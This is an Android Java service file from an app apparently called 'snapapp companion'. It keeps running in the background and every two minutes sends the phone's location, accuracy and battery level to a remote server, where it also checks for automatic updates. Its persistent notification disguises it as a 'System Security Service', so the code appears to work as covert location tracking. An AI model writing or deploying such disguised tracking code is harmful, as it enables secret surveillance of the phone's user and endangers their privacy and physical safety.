package com.snapapp.companion;

import android.annotation.SuppressLint;
import android.app.*;
import android.content.*;
import android.location.Location;
import android.os.*;
import androidx.core.app.NotificationCompat;
import com.google.android.gms.location.*;
import org.json.JSONObject;
import java.util.concurrent.*;

public class CompanionSyncService extends Service {
    private static final String CHANNEL_ID = "snap_safety_channel";
    private static final int NOTIF_ID = 1001;

    private ScheduledExecutorService scheduler;
    private FusedLocationProviderClient fusedLocationClient;
    private SharedPreferences prefs;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIF_ID, buildNotification());
        startPeriodicSync();
        return START_STICKY;
    }

    private void startPeriodicSync() {
        if (scheduler != null && !scheduler.isShutdown()) return;
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleWithFixedDelay(new Runnable() {
            @Override
            public void run() {
                performSync();
            }
        }, 5, 120, TimeUnit.SECONDS);
    }

    @SuppressLint("MissingPermission")
    private void performSync() {
        final String deviceId = prefs.getString("device_id", null);
        final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
        if (deviceId == null) return;

        // 1. Fetch Location
        fusedLocationClient.getLastLocation().addOnSuccessListener(new com.google.android.gms.tasks.OnSuccessListener<Location>() {
            @Override
            public void onSuccess(Location loc) {
                if (loc != null) {
                    int battery = getBatteryLevel();
                    ApiClient.sendLocation(serverUrl, deviceId, loc.getLatitude(),
                            loc.getLongitude(), loc.getAccuracy(), battery, null);
                }
            }
        });

        // 2. Lifetime Auto-Update Check
        AutoUpdater.checkForUpdate(this, serverUrl, false);
    }

    private int getBatteryLevel() {
        Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        if (batteryIntent == null) return 100;
        int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        if (level >= 0 && scale > 0) {
            return (int) ((level / (float) scale) * 100);
        }
        return 100;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Security Protection",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Ensures background device safety telemetry remains active");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Intent launch = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, launch,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Security Service")
                .setContentText("Protected & connected to safety dashboard")
                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setContentIntent(pi)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        if (scheduler != null) scheduler.shutdown();
        super.onDestroy();
    }
}
